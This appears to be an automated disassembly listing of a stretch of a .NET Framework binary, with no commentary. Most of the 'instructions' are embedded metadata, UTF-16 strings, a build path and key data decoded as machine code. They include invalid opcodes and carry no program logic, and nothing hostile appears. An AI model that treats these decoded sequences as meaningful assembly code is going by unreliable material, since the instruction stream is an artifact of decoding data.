  404ebe:	add    BYTE PTR [esi],ch
  404ec0:	add    BYTE PTR [ebp+0x0],dh
  404ec3:	je     0x404ec5
  404ec5:	imul   eax,DWORD PTR [eax],0x69006c
  404ecb:	je     0x404ecd
  404ecd:	imul   eax,DWORD PTR [eax],0x730065
  404ed3:	add    BYTE PTR cs:[eax+eax*1+0x6c],ah
  404ed8:	add    BYTE PTR [eax+eax*1+0x0],ch
  404edc:	dec    edi
  404edd:	jbe    0x404edf
  404edf:	jae    0x404ee1
  404ee1:	je     0x404ee3
  404ee3:	add    BYTE PTR gs:[ebx+0x0],dh
  404ee7:	je     0x404ee9
  404ee9:	add    BYTE PTR cs:[ebp+0x0],ah
  404eed:	js     0x404eef
  404eef:	add    BYTE PTR gs:[ebx+0x0],ah
  404ef3:	jne    0x404ef5
  404ef5:	je     0x404ef7
  404ef7:	imul   eax,DWORD PTR [eax],0x6e006f
  404efd:	add    BYTE PTR gs:[esi+0x0],ch
  404f01:	add    BYTE PTR [bx+di+0x0],ch
  404f05:	outs   dx,BYTE PTR ds:[esi]
  404f06:	add    BYTE PTR [ebp+0x0],ah
  404f09:	add    BYTE PTR cs:[ecx+0x0],ah
  404f0d:	jo     0x404f0f
  404f0f:	jo     0x404f11
  404f11:	arpl   WORD PTR [eax],ax
  404f13:	outs   dx,DWORD PTR ds:[esi]
  404f14:	add    BYTE PTR [esi+0x0],ch
  404f17:	je     0x404f19
  404f19:	popa   
  404f1a:	add    BYTE PTR [ecx+0x0],ch
  404f1d:	outs   dx,BYTE PTR ds:[esi]
  404f1e:	add    BYTE PTR [ebp+0x0],ah
  404f21:	jb     0x404f23
  404f23:	add    BYTE PTR cs:[ebp+0x0],ah
  404f27:	js     0x404f29
  404f29:	add    BYTE PTR gs:[eax],al
  404f2c:	push   edi
  404f2d:	jbe    0x404f2f
  404f2f:	jae    0x404f31
  404f31:	je     0x404f33
  404f33:	add    BYTE PTR gs:[ebx+0x0],dh
  404f37:	je     0x404f39
  404f39:	add    BYTE PTR cs:[ebp+0x0],ah
  404f3d:	js     0x404f3f
  404f3f:	add    BYTE PTR gs:[ebx+0x0],ah
  404f43:	jne    0x404f45
  404f45:	je     0x404f47
  404f47:	imul   eax,DWORD PTR [eax],0x6e006f
  404f4d:	add    BYTE PTR gs:[esi+0x0],ch
  404f51:	add    BYTE PTR [bx+di+0x0],ch
  404f55:	outs   dx,BYTE PTR ds:[esi]
  404f56:	add    BYTE PTR [ebp+0x0],ah
  404f59:	add    BYTE PTR cs:[ecx+0x0],ah
  404f5d:	jo     0x404f5f
  404f5f:	jo     0x404f61
  404f61:	arpl   WORD PTR [eax],ax
  404f63:	outs   dx,DWORD PTR ds:[esi]
  404f64:	add    BYTE PTR [esi+0x0],ch
  404f67:	je     0x404f69
  404f69:	popa   
  404f6a:	add    BYTE PTR [ecx+0x0],ch
  404f6d:	outs   dx,BYTE PTR ds:[esi]
  404f6e:	add    BYTE PTR [ebp+0x0],ah
  404f71:	jb     0x404f73
  404f73:	add    BYTE PTR cs:[eax+0x0],bh
  404f77:	cmp    BYTE PTR [eax],al
  404f79:	add    BYTE PTR ss:[esi],ch
  404f7c:	add    BYTE PTR [ebp+0x0],ah
  404f7f:	js     0x404f81
  404f81:	add    BYTE PTR gs:[eax],al
  404f84:	fist   DWORD PTR [ebp-0x4e]
  404f87:	push   ebp
  404f88:	mov    ah,0xd4
  404f8a:	rol    BYTE PTR [ecx+edi*4-0x3c],0x8b
  404f8f:	shr    bh,1
  404f91:	shl    BYTE PTR [edi],0x13
  404f94:	add    BYTE PTR [eax],cl
  404f96:	mov    bh,0x7a
  404f98:	pop    esp
  404f99:	push   esi
  404f9a:	sbb    DWORD PTR [eax+eiz*8],esi
  404f9d:	mov    DWORD PTR [eax],ecx
  404f9f:	push   es
  404fa0:	adc    eax,0xe021912
  404fa5:	adc    cl,BYTE PTR [ecx]
  404fa7:	or     BYTE PTR [esi],al
  404fa9:	adc    eax,0xe021912
  404fae:	adc    cl,BYTE PTR ds:0x12150606
  404fb4:	sbb    eax,0x20080e01
  404fb9:	add    DWORD PTR [ecx],eax
  404fbb:	adc    eax,0xe011d12
  404fc0:	add    eax,0x9120120
  404fc5:	push   cs
  404fc6:	pop    es
  404fc7:	and    BYTE PTR [edx],al
  404fc9:	adc    cl,BYTE PTR ds:0x80e2112
  404fcf:	and    BYTE PTR [ebx],al
  404fd1:	adc    ah,BYTE PTR [ecx]
  404fd3:	adc    ah,BYTE PTR ds:0x2005020e
  404fd9:	add    DWORD PTR [edx],eax
  404fdb:	adc    ah,BYTE PTR [ecx]
  404fdd:	add    al,BYTE PTR [esi]
  404fdf:	push   cs
  404fe0:	add    eax,DWORD PTR [esi]
  404fe2:	adc    ah,BYTE PTR [ecx]
  404fe4:	push   es
  404fe5:	and    BYTE PTR [edx],al
  404fe7:	add    DWORD PTR [esi],ecx
  404fe9:	adc    ah,BYTE PTR [ecx]
  404feb:	add    esp,DWORD PTR [eax]
  404fed:	add    BYTE PTR [edx],al
  404fef:	add    esp,DWORD PTR [eax]
  404ff1:	add    BYTE PTR [esi],cl
  404ff3:	add    al,0x20
  404ff5:	add    BYTE PTR [edx],dl
  404ff7:	and    DWORD PTR [eax+eiz*1],eax
  404ffa:	add    BYTE PTR [edx],dl
  404ffc:	or     DWORD PTR [eax+eiz*1],eax
  404fff:	add    BYTE PTR [edx],dl
  405001:	or     eax,0x12012005
  405006:	or     eax,0x20030e
  40500b:	sbb    al,0x6
  40500d:	and    BYTE PTR [ebx],al
  40500f:	add    DWORD PTR [esp+ebx*1],ebx
  405012:	sbb    al,0x5
  405014:	and    BYTE PTR [edx],al
  405016:	add    DWORD PTR [esp+ebx*1],ebx
  405019:	add    esp,DWORD PTR [eax]
  40501b:	add    BYTE PTR [ecx],al
  40501d:	add    al,0x20
  40501f:	add    DWORD PTR [esi+ecx*1],ebx
  405022:	add    ebp,DWORD PTR [eax]
  405024:	add    BYTE PTR [edx],al
  405026:	add    ebp,DWORD PTR [eax]
  405028:	add    BYTE PTR [esi],cl
  40502a:	add    al,0x28
  40502c:	add    BYTE PTR [edx],dl
  40502e:	and    DWORD PTR [eax+ebp*1],eax
  405031:	add    BYTE PTR [edx],dl
  405033:	or     DWORD PTR [eax+ebp*1],eax
  405036:	add    BYTE PTR [edx],dl
  405038:	or     eax,0x8120603
  40503d:	add    eax,DWORD PTR [esi]
  40503f:	adc    cl,BYTE PTR [ecx]
  405041:	add    eax,DWORD PTR [esi]
  405043:	adc    ch,BYTE PTR [ecx]
  405045:	add    eax,DWORD PTR [esi]
  405047:	adc    ch,BYTE PTR ds:0x104200a
  40504d:	adc    cl,BYTE PTR [eax]
  40504f:	push   cs
  405050:	adc    ah,BYTE PTR [ecx]
  405052:	adc    cl,BYTE PTR [ecx]
  405054:	pop    es
  405055:	xor    BYTE PTR [ecx],al
  405057:	add    cl,BYTE PTR [esi]
  405059:	adc    dh,BYTE PTR [ecx]
  40505b:	push   cs
  40505c:	add    eax,DWORD PTR [esi]
  40505e:	adc    bh,BYTE PTR [ecx]
  405060:	or     BYTE PTR [eax],ah
  405062:	add    eax,DWORD PTR [ecx]
  405064:	adc    cl,BYTE PTR [eax]
  405066:	push   cs
  405067:	adc    ah,BYTE PTR [ecx]
  405069:	add    al,0x20
  40506b:	add    DWORD PTR [esp+ebx*1],ebx
  40506e:	add    eax,0x1d010100
  405073:	push   cs
  405074:	add    eax,0x111d0020
  405079:	cmp    eax,0x1012005
  40507e:	adc    al,BYTE PTR [ecx+0x6]
  405081:	and    BYTE PTR [ecx],al
  405083:	adc    cl,BYTE PTR [ecx]
  405085:	adc    ah,BYTE PTR [ecx]
  405087:	add    al,0x20
  405089:	add    DWORD PTR [ecx],eax
  40508b:	push   cs
  40508c:	add    al,0x20
  40508e:	add    DWORD PTR [ecx],eax
  405090:	add    al,BYTE PTR ds:0xe010220
  405096:	push   cs
  405097:	push   es
  405098:	and    BYTE PTR [ecx],al
  40509a:	add    DWORD PTR [ecx],edx
  40509c:	adc    BYTE PTR [ecx+0x1012004],0x8
  4050a3:	and    BYTE PTR [eax+0x2400],0x4
  4050aa:	add    BYTE PTR [eax],0x0
  4050ad:	xchg   esp,eax
  4050ae:	add    BYTE PTR [eax],al
  4050b0:	add    BYTE PTR [esi],al
  4050b2:	add    al,BYTE PTR [eax]
  4050b4:	add    BYTE PTR [eax],al
  4050b6:	and    al,0x0
  4050b8:	add    BYTE PTR [edx+0x53],dl
  4050bb:	inc    ecx
  4050bc:	xor    DWORD PTR [eax],eax
  4050be:	add    al,0x0
  4050c0:	add    BYTE PTR [ecx],al
  4050c2:	add    BYTE PTR [ecx],al
  4050c4:	add    BYTE PTR [edi],al
  4050c6:	sar    edx,1
  4050c8:	push   edi
  4050c9:	les    ebp,FWORD PTR [esi+0x2ea3f0d9]
  4050cf:	test   BYTE PTR [edx+0xdfdae0f],ch
  4050d5:	jmp    0xecab4ec2
  4050da:	pop    DWORD PTR [edi+0x6c7603fb]
  4050e0:	or     DWORD PTR [ecx+ebx*4-0x6e],0x1e
  4050e5:	mov    dl,0x3b
  4050e7:	out    0x9a,eax
  4050e9:	(bad)  
  4050eb:	fadd   st(1),st
  4050ed:	fstp   QWORD PTR [edx+0x211336d2]
  4050f3:	add    dl,BYTE PTR [eax-0x6c38df5]
  4050f9:	adc    BYTE PTR [ebp+0x77e1c47f],0x10
  405100:	pop    esi
  405102:	pop    es
  405103:	ja     0x405154
  405105:	sub    eax,ebp
  405107:	xor    cl,BYTE PTR [esi]
  405109:	xchg   edx,eax
  40510a:	jmp    0xc021:0xe8e4ec05
  405111:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405112:	out    dx,eax
  405113:	call   0x4c9cb609
  405118:	or     al,0x93
  40511a:	shr    DWORD PTR [ebx+0x625d2899],0x2c
  405121:	stos   BYTE PTR es:[edi],al
  405122:	gs sub al,0x1d
  405125:	cli    
  405126:	(bad)  
  405127:	cmp    eax,0x2d6f5d74
  40512c:	in     eax,0xf1
  40512e:	jle    0x40518e
  405130:	scas   eax,DWORD PTR es:[edi]
  405131:	pinsrw mm2,WORD PTR [esi-0x75e3d9c3],0x12
  405139:	inc    ebx
  40513a:	sbb    BYTE PTR gs:[eax],ah
  40513d:	ins    DWORD PTR es:[edi],dx
  40513e:	rcl    BYTE PTR [ebx-0x2da5b2cc],0x93
  405145:	add    eax,0x1
  40514a:	add    BYTE PTR [edi],al
  40514c:	adc    eax,0xe021912
  405151:	adc    cl,BYTE PTR [ecx]
  405153:	pop    es
  405154:	adc    eax,0xe021912
  405159:	adc    cl,BYTE PTR ds:0x2010004
  40515f:	push   cs
  405160:	or     BYTE PTR [eax],ah
  405162:	add    al,BYTE PTR [edx]
  405164:	adc    eax,DWORD PTR [eax]
  405166:	adc    BYTE PTR [ebx],dl
  405168:	add    DWORD PTR [edi],eax
  40516a:	and    BYTE PTR [edx],al
  40516c:	add    DWORD PTR [ebx],edx
  40516e:	add    BYTE PTR [ebx],dl
  405170:	add    DWORD PTR [edi+eax*1],eax
  405173:	add    DWORD PTR [edx],edx
  405175:	or     DWORD PTR [edi+eax*1],eax
  405178:	add    DWORD PTR [edx],edx
  40517a:	or     eax,0x12010005
  40517f:	and    DWORD PTR [esi],ecx
  405181:	pop    es
  405182:	add    BYTE PTR [edx],al
  405184:	add    dl,BYTE PTR [edx]
  405186:	and    DWORD PTR [edx],edx
  405188:	and    DWORD PTR [ebx],ecx
  40518a:	adc    eax,0x4a18012
  40518f:	adc    ah,BYTE PTR ds:0x2112020e
  405195:	add    eax,0x1c010220
  40519a:	sbb    BYTE PTR [edx],bl
  40519c:	add    BYTE PTR [ebx],al
  40519e:	adc    ah,BYTE PTR [ecx]
  4051a0:	push   cs
  4051a1:	adc    eax,0x2a58012
  4051a6:	adc    al,BYTE PTR [eax+0x152512a9]
  4051ac:	adc    al,BYTE PTR [eax+0x251204a1]
  4051b2:	push   cs
  4051b3:	add    dl,BYTE PTR [edx]
  4051b5:	and    DWORD PTR [edi+eax*1],eax
  4051b8:	add    DWORD PTR [edx],edx
  4051ba:	and    DWORD PTR ds:0x80120000,eax
  4051c0:	lods   eax,DWORD PTR ds:[esi]
  4051c1:	or     DWORD PTR [eax],eax
  4051c3:	add    ecx,DWORD PTR [esi]
  4051c5:	adc    al,BYTE PTR [eax+0x1c1d0eb1]
  4051cb:	add    eax,0x11d1215
  4051d0:	push   cs
  4051d1:	or     DWORD PTR [eax],esp
  4051d3:	add    BYTE PTR ds:0x1b58011,dl
  4051d9:	adc    eax,DWORD PTR [eax]
  4051db:	push   es
  4051dc:	adc    eax,0x1b58011
  4051e1:	push   cs
  4051e2:	add    al,0x20
  4051e4:	add    BYTE PTR [ebx],dl
  4051e6:	add    BYTE PTR [ecx],dl
  4051e8:	pop    es
  4051e9:	push   es
  4051ea:	adc    ah,BYTE PTR [ecx]
  4051ec:	push   cs
  4051ed:	adc    ah,BYTE PTR [ecx]
  4051ef:	sbb    eax,0x8011151c
  4051f4:	mov    ch,0x1
  4051f6:	push   cs
  4051f7:	sbb    eax,0x220071c
  4051fc:	add    cl,BYTE PTR [esi]
  4051fe:	adc    DWORD PTR [eax+0x10703c1],eax
  405204:	push   cs
  405205:	add    al,0x20
  405207:	add    DWORD PTR [eax],ecx
  405209:	add    eax,DWORD PTR [eax+eiz*1]
  40520c:	add    DWORD PTR [esi],ecx
  40520e:	or     BYTE PTR [ebx],al
  405210:	pop    es
  405211:	add    DWORD PTR [eax],ecx
  405213:	add    eax,0x8012010a
  405218:	leave  
  405219:	add    al,0x6
  40521b:	sbb    eax,0x20072112
  405220:	add    DWORD PTR [edx],edx
  405222:	sub    DWORD PTR ds:0x15072112,ebx
  405228:	adc    al,BYTE PTR [eax+0x1c1c02cd]
  40522e:	pop    es
  40522f:	add    BYTE PTR [ecx],al
  405231:	adc    ah,BYTE PTR [ecx]
  405233:	adc    DWORD PTR [eax+0x12005d1],eax
  405239:	adc    ah,BYTE PTR [ecx]
  40523b:	push   cs
  40523c:	add    eax,0x2d120120
  405241:	push   cs
  405242:	add    eax,0x121d0020
  405247:	and    DWORD PTR [esi],eax
  405249:	adc    eax,0x1d58012
  40524e:	sbb    al,0xd
  405250:	pop    es
  405251:	add    eax,0x1d21120e
  405256:	adc    ah,BYTE PTR [ecx]
  405258:	adc    ah,BYTE PTR [ecx]
  40525a:	sbb    eax,0x200a2112
  40525f:	add    BYTE PTR ds:0x1d98012,dl
  405265:	adc    al,BYTE PTR [eax+0x121508dd]
  40526b:	and    cl,0x1
  40526e:	adc    al,BYTE PTR [eax+0x2009dd]
  405274:	adc    eax,0x1e58012
  405279:	adc    eax,DWORD PTR [eax]
  40527b:	or     BYTE PTR ds:0x1e58012,dl
  405281:	adc    al,BYTE PTR [eax+0x2004dd]
  405287:	adc    ch,BYTE PTR [ecx]
  405289:	add    bl,BYTE PTR [esi]
  40528b:	add    BYTE PTR [edx],cl
  40528d:	and    BYTE PTR [eax],al
  40528f:	adc    eax,0x1d98012
  405294:	adc    DWORD PTR [eax+0x121508e9],eax
  40529a:	and    cl,0x1
  40529d:	adc    DWORD PTR [eax+0x121508e9],eax
  4052a3:	and    ch,0x1
  4052a6:	adc    DWORD PTR [eax+0x2004e9],eax
  4052ac:	adc    dh,BYTE PTR [ecx]
  4052ae:	add    eax,0xe020200
  4052b3:	push   cs
  4052b4:	add    eax,0x80110020
  4052b9:	in     eax,dx
  4052ba:	and    al,0x7
  4052bc:	pop    es
  4052bd:	adc    eax,0x1d98012
  4052c2:	adc    al,BYTE PTR [eax-0x227fed23]
  4052c8:	adc    DWORD PTR [eax+0x12150ee9],eax
  4052ce:	and    ch,0x1
  4052d1:	adc    al,BYTE PTR [eax-0x7fedea23]
  4052d7:	in     eax,0x1
  4052d9:	adc    DWORD PTR [eax-0x127fee17],eax
  4052df:	pop    es
  4052e0:	add    BYTE PTR [edx],al
  4052e2:	add    dl,BYTE PTR [edx]
  4052e4:	sub    eax,0x72d12
  4052e9:	add    al,BYTE PTR [edx]
  4052eb:	adc    ch,BYTE PTR [ecx]
  4052ed:	adc    ch,BYTE PTR [ecx]
  4052ef:	add    eax,0x1d1c0120
  4052f4:	sbb    al,0x6
  4052f6:	and    BYTE PTR [edx],al
  4052f8:	sbb    al,0x1c
  4052fa:	sbb    eax,0x107041c
  4052ff:	sbb    eax,0x20051c
  405304:	adc    DWORD PTR [eax+0x10006d1],eax
  40530a:	add    DWORD PTR [ecx],edx
  40530c:	adc    cl,0x5
  40530f:	and    BYTE PTR [ecx],al
  405311:	adc    bh,BYTE PTR [ecx]
  405313:	push   cs
  405314:	pop    es
  405315:	add    BYTE PTR [edx],al
  405317:	add    dl,BYTE PTR [edx]
  405319:	cmp    DWORD PTR [edx],edx
  40531b:	cmp    DWORD PTR [eax+eiz*1],eax
  40531e:	add    DWORD PTR [esi],ecx
  405320:	sbb    al,0x6
  405322:	add    BYTE PTR [edx],al
  405324:	sbb    al,0x12
  405326:	and    DWORD PTR [esi],ecx
  405328:	pop    es
  405329:	and    BYTE PTR [ebx],al
  40532b:	add    DWORD PTR [esp+ebx*1],ebx
  40532e:	sbb    eax,0x207051c
  405333:	adc    ah,BYTE PTR [ecx]
  405335:	push   cs
  405336:	push   es
  405337:	add    BYTE PTR [ecx],al
  405339:	add    DWORD PTR [edx],edx
  40533b:	add    DWORD PTR ds:0x81120604,0x10409
  405345:	add    BYTE PTR [eax],al
  405347:	add    al,0x0
  405349:	add    DWORD PTR [esi],ecx
  40534b:	push   cs
  40534c:	push   es
  40534d:	add    BYTE PTR [edx],al
  40534f:	add    cl,BYTE PTR [esi]
  405351:	adc    BYTE PTR [eax],cl
  405353:	push   es
  405354:	add    BYTE PTR [edx],al
  405356:	add    dl,BYTE PTR [edx]
  405358:	and    DWORD PTR [esi+eax*1],ebx
  40535b:	add    BYTE PTR [edx],al
  40535d:	sbb    al,0x12
  40535f:	and    DWORD PTR [eax],ecx
  405361:	or     BYTE PTR [eax+0x117f5f3f],dh
  405367:	aad    0xa
  405369:	cmp    al,BYTE PTR [esi]
  40536b:	add    BYTE PTR [ecx],al
  40536d:	add    DWORD PTR [ecx],edx
  40536f:	and    DWORD PTR [ecx],0x1010004
  405375:	or     BYTE PTR [esi],al
  405377:	add    BYTE PTR [ecx],al
  405379:	add    DWORD PTR [edx],edx
  40537b:	or     DWORD PTR [ecx],0x8030705
  405381:	push   cs
  405382:	or     BYTE PTR ds:0x81120020,al
  405388:	sub    DWORD PTR [eax+eiz*1],eax
  40538b:	add    BYTE PTR [edx],dl
  40538d:	and    eax,0x12002005
  405392:	xor    DWORD PTR [ecx],0x1d002006
  405398:	adc    al,BYTE PTR [ecx+0x120052d]
  40539e:	add    dl,BYTE PTR [ebx]
  4053a0:	add    BYTE PTR [edx],cl
  4053a2:	pop    es
  4053a3:	add    edx,DWORD PTR [edx]
  4053a5:	sub    DWORD PTR ds:0x2d81121d,0x4000908
  4053af:	or     BYTE PTR [esi],cl
  4053b1:	push   cs
  4053b2:	add    dl,BYTE PTR [edx]
  4053b4:	sub    BYTE PTR [ebp+0x1000003],0x4
  4053bb:	push   es
  4053bc:	adc    al,BYTE PTR [ecx+0x120053d]
  4053c2:	add    DWORD PTR ds:0x207070e,ebx
  4053c8:	adc    al,BYTE PTR [ecx+0x50e1d41]
  4053ce:	and    BYTE PTR [eax],al
  4053d0:	adc    DWORD PTR [ecx+0x1200645],eax
  4053d6:	add    DWORD PTR [edx],edx
  4053d8:	cmp    DWORD PTR ds:0x12010705,0x200a2581
  4053e2:	add    DWORD PTR [ecx],eax
  4053e4:	adc    eax,0x1e18012
  4053e9:	adc    eax,DWORD PTR [eax]
  4053eb:	push   es
  4053ec:	pop    es
  4053ed:	add    bl,BYTE PTR ds:0x370e1d0e
  4053f3:	add    DWORD PTR [eax],eax
  4053f5:	sbb    ch,BYTE PTR [esi]
  4053f7:	dec    esi
  4053f8:	inc    ebp
  4053f9:	push   esp
  4053fa:	inc    esi
  4053fb:	jb     0x40545e
  4053fd:	ins    DWORD PTR es:[edi],dx
  4053fe:	gs ja  0x405470
  405401:	jb     0x40546e
  405403:	sub    al,0x56
  405405:	gs jb  0x40547b
  405408:	imul   ebp,DWORD PTR [edi+0x6e],0x2e34763d
  40540f:	xor    eax,0xe540001
  405414:	adc    al,0x46
  405416:	jb     0x405479
  405418:	ins    DWORD PTR es:[edi],dx
  405419:	gs ja  0x40548b
  40541c:	jb     0x405489
  40541e:	inc    esp
  40541f:	imul   esi,DWORD PTR [ebx+0x70],0x4e79616c
  405426:	popa   
  405427:	ins    DWORD PTR es:[edi],dx
  405428:	add    BYTE PTR gs:0x10001,al
  40542f:	add    BYTE PTR [ecx+eax*1],ch
  405432:	add    BYTE PTR [edi],ah
  405434:	jbe    0x4054a9
  405436:	je     0x40549d
  405438:	jae    0x4054ae
  40543a:	cs gs js 0x4054a3
  40543e:	arpl   WORD PTR [ebp+0x74],si
  405441:	imul   ebp,DWORD PTR [edi+0x6e],0x69676e65
  405448:	outs   dx,BYTE PTR ds:[esi]
  405449:	gs cs popa 
  40544c:	jo     0x4054be
  40544e:	arpl   WORD PTR [edi+0x6e],bp
  405451:	je     0x4054b4
  405453:	imul   ebp,DWORD PTR [esi+0x65],0x78652e72
  40545a:	add    BYTE PTR gs:[eax],al
  40545d:	sbb    al,BYTE PTR [ecx]
  40545f:	add    BYTE PTR ds:0x7263694d,dl
  405465:	outs   dx,DWORD PTR ds:[esi]
  405466:	jae    0x4054d7
  405468:	data16 je 0x40548b
  40546b:	inc    ebx
  40546c:	outs   dx,DWORD PTR ds:[esi]
  40546d:	jb     0x4054df
  40546f:	outs   dx,DWORD PTR ds:[esi]
  405470:	jb     0x4054d3
  405472:	je     0x4054dd
  405474:	outs   dx,DWORD PTR ds:[esi]
  405475:	outs   dx,BYTE PTR ds:[esi]
  405476:	add    BYTE PTR [eax],al
  405478:	and    eax,0x4d200001
  40547d:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  405484:	je     0x405448
  405486:	scas   al,BYTE PTR es:[edi]
  405487:	and    BYTE PTR [esi+0x69],dl
  40548a:	jae    0x405501
  40548c:	popa   
  40548d:	ins    BYTE PTR es:[edi],dx
  40548e:	and    BYTE PTR [ebx+0x74],dl
  405491:	jne    0x4054f7
  405493:	imul   ebp,DWORD PTR [edi-0x3e],0x303220ae
  40549a:	xor    DWORD PTR [edx],esi
  40549c:	add    BYTE PTR [eax],al
  40549e:	xor    eax,DWORD PTR [ecx]
  4054a0:	add    BYTE PTR [esi],ch
  4054a2:	ret    0x20a9
  4054a5:	dec    ebp
  4054a6:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  4054ad:	je     0x4054cf
  4054af:	inc    ebx
  4054b0:	outs   dx,DWORD PTR ds:[esi]
  4054b1:	jb     0x405523
  4054b3:	outs   dx,DWORD PTR ds:[esi]
  4054b4:	jb     0x405517
  4054b6:	je     0x405521
  4054b8:	outs   dx,DWORD PTR ds:[esi]
  4054b9:	outs   dx,BYTE PTR ds:[esi]
  4054ba:	and    BYTE PTR cs:[ecx+0x6c],al
  4054be:	ins    BYTE PTR es:[edi],dx
  4054bf:	and    BYTE PTR [edx+0x69],dh
  4054c2:	addr16 push 0x72207374
  4054c8:	gs jae 0x405530
  4054cb:	jb     0x405543
  4054cd:	gs fs add BYTE PTR cs:[eax],al
  4054d2:	adc    DWORD PTR [ecx],eax
  4054d4:	add    BYTE PTR [ecx+esi*1],cl
  4054d7:	xor    DWORD PTR [esi],ebp
  4054d9:	xor    BYTE PTR [esi],ch
  4054db:	xor    eax,0x37323730
  4054e0:	xor    DWORD PTR cs:[eax],eax
  4054e3:	add    BYTE PTR ds:0x31080001,cl
  4054e9:	xor    DWORD PTR [esi],ebp
  4054eb:	xor    BYTE PTR [esi],ch
  4054ed:	xor    BYTE PTR [esi],ch
  4054ef:	xor    BYTE PTR [eax],al
  4054f1:	add    BYTE PTR [edx],cl
  4054f3:	add    DWORD PTR [eax],eax
  4054f5:	add    eax,0x552d6e65
  4054fa:	push   ebx
  4054fb:	add    BYTE PTR [eax],al
  4054fd:	sub    al,BYTE PTR [ecx]
  4054ff:	add    BYTE PTR ds:0x645c3a46,ah
  405505:	fs pop esp
  405507:	je     0x405578
  405509:	outs   dx,DWORD PTR ds:[esi]
  40550a:	ins    BYTE PTR es:[edi],dx
  40550b:	jae    0x405569
  40550d:	fs gs jbe 0x405575
  405511:	imul   esi,DWORD PTR [esi+0x5c],0x616e6946
  405518:	ins    BYTE PTR es:[edi],dx
  405519:	push   eax
  40551a:	jne    0x40557e
  40551c:	ins    BYTE PTR es:[edi],dx
  40551d:	imul   esp,DWORD PTR [ebx+0x4b],0x732e7965
  405524:	outs   dx,BYTE PTR ds:[esi]
  405525:	imul   eax,DWORD PTR [eax],0x0
  405528:	or     DWORD PTR [eax+0x1],0x0
  40552c:	add    BYTE PTR [eax+0x30],0x30
  405530:	xor    dh,BYTE PTR [eax+esi*1]
  405533:	xor    BYTE PTR [eax],dh
  405535:	xor    BYTE PTR [eax],dh
  405537:	arpl   WORD PTR [eax],di
  405539:	xor    BYTE PTR [eax],dh
  40553b:	xor    BYTE PTR [eax],dh
  40553d:	xor    BYTE PTR [ecx],dh
  40553f:	xor    al,0x30
  405541:	xor    DWORD PTR [eax],esi
  405543:	xor    BYTE PTR [eax],dh
  405545:	xor    BYTE PTR [eax],dh
  405547:	xor    BYTE PTR ss:[edx],dh
  40554a:	xor    BYTE PTR [eax],dh
  40554c:	xor    BYTE PTR [eax],dh
  40554e:	xor    BYTE PTR [eax],dh
  405550:	xor    dh,BYTE PTR [eax+esi*1]
  405553:	xor    BYTE PTR [eax],dh
  405555:	xor    BYTE PTR ds:0x34333532,dh
  40555b:	xor    DWORD PTR [ebx],esi
  40555d:	xor    DWORD PTR [eax],esi
  40555f:	xor    BYTE PTR [eax],dh
  405561:	cmp    BYTE PTR [eax],dh
  405563:	xor    BYTE PTR [eax],dh
  405565:	xor    BYTE PTR [eax],dh
  405567:	xor    DWORD PTR [eax],esi
  405569:	xor    BYTE PTR [eax],dh
  40556b:	xor    DWORD PTR [eax],esi
  40556d:	xor    BYTE PTR [esi],dh
  40556f:	xor    DWORD PTR [ebx],esi
  405571:	xor    edi,DWORD PTR [ecx]
  405573:	cmp    DWORD PTR [ecx+0x66],esp
  405576:	xor    WORD PTR [eax],di
  405579:	xor    WORD PTR gs:[ecx+0x32],sp
  40557e:	arpl   WORD PTR [edx],si
  405580:	xor    eax,0x32613431
  405585:	aaa    
  405586:	xor    esp,DWORD PTR [ecx+0x34]
  405589:	xor    ah,BYTE PTR [ecx+edi*1+0x30]
  40558d:	xor    al,0x32
  40558f:	bound  esi,QWORD PTR [edi]
  405591:	xor    dh,BYTE PTR [ebx]
  405593:	xor    dh,BYTE PTR [ecx]
  405595:	xor    WORD PTR [edi],si
  405598:	xor    eax,0x32303137
  40559d:	cmp    WORD PTR fs:[ebp+0x62],sp
  4055a2:	popa   
  4055a3:	fs popa 
  4055a5:	cmp    DWORD PTR ss:[ecx],edi
  4055a8:	xor    dh,BYTE PTR [ebx]
  4055aa:	xor    dh,BYTE PTR gs:[edi]
  4055ad:	xor    edi,DWORD PTR [eax]
  4055af:	xor    al,0x30
  4055b1:	arpl   WORD PTR ss:[edx],si
  4055b4:	xor    DWORD PTR [ebp+0x35],esp
  4055b7:	bound  edi,QWORD PTR [eax]
  4055b9:	xor    BYTE PTR [ecx],dh
  4055bb:	xor    eax,0x62613235
  4055c0:	cmp    BYTE PTR [edx+esi*1+0x30],ah
  4055c4:	xor    BYTE PTR [ecx+0x36],ah
  4055c7:	xor    eax,0x35333261
  4055cc:	xor    BYTE PTR gs:[eax],dh
  4055cf:	xor    DWORD PTR [ecx+0x63],esp
  4055d2:	cmp    DWORD PTR [ecx+0x64],esp
  4055d5:	arpl   WORD PTR [edx],si
  4055d7:	xor    eax,0x38643266
  4055dc:	xor    DWORD PTR [ecx],esi
  4055de:	bound  esi,QWORD PTR gs:[eax]
  4055e1:	cmp    DWORD PTR [ecx+edi*1],esi
  4055e4:	ss popa 
  4055e6:	xor    al,0x63
  4055e8:	ss popa 
  4055ea:	xor    eax,0x36346439
  4055ef:	xor    DWORD PTR [ecx],edi
  4055f1:	xor    eax,0x36633938
  4055f6:	cmp    DWORD PTR [esi+0x35],esp
  4055f9:	bound  esp,QWORD PTR [ecx+0x66]
  4055fc:	xor    BYTE PTR [ebx+0x34],ah
  4055ff:	xor    DWORD PTR [edi],esi
  405601:	cmp    DWORD PTR [ecx+0x34],esp
  405604:	aaa    
  405605:	xor    esi,DWORD PTR [ecx]
  405607:	xor    DWORD PTR [ecx+edi*1+0x32],esp
  40560b:	xor    eax,0x64633535
  405610:	xor    BYTE PTR [eax],dh
  405612:	ss popa 
  405614:	arpl   WORD PTR [ebx+0x38],sp
  405617:	bound  esi,QWORD PTR ds:0x66393539
  40561d:	xor    ah,BYTE PTR [edx+0x64]
  405620:	ss xor DWORD PTR gs:[eax],esi
  405624:	xor    esi,DWORD PTR gs:[esi]
  405627:	xor    BYTE PTR [ebx+0x33],ah
  40562a:	xor    al,0x35
  40562c:	xor    esi,DWORD PTR [edi]
  40562e:	popa   
  40562f:	xor    DWORD PTR [edx+esi*1+0x36],esp
  405633:	ss fs popa 
  405636:	cmp    BYTE PTR [eax],dh
  405638:	cmp    BYTE PTR ds:0x35363538,dh
  40563e:	cmp    BYTE PTR [ebx],dh
  405640:	arpl   WORD PTR [eax],di
  405642:	xor    eax,0x64313864
  405647:	popa   
  405648:	aaa    
  405649:	xor    sp,WORD PTR [ebp+0x63]
  40564d:	xor    BYTE PTR [ecx],dh
